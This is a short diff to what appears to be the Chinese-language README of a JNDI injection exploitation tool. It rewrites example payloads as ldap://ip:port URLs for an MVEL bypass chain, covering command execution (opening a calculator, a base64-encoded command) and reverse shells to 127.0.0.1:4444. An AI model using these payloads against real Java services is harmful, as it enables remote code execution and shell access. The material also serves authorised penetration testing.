@@ -350,10 +350,10 @@ Vaadin1
 ```
 可以进行组合执行
 ```
-/bypass/mvel/open%20-a%20calculator
-/bypass/mvel/base64/b3BlbiAtYSBjYWxjdWxhdG9y
-/bypass/mvel/reverseshell/127.0.0.1/4444
-/bypass/mvel/reverseshell2/127.0.0.1/4444
+ldap://ip:port/bypass/mvel/open%20-a%20calculator
+ldap://ip:port/bypass/mvel/base64/b3BlbiAtYSBjYWxjdWxhdG9y
+ldap://ip:port/bypass/mvel/reverseshell/127.0.0.1/4444
+ldap://ip:port/bypass/mvel/reverseshell2/127.0.0.1/4444
 ```
 
 ## 利用链特殊说明
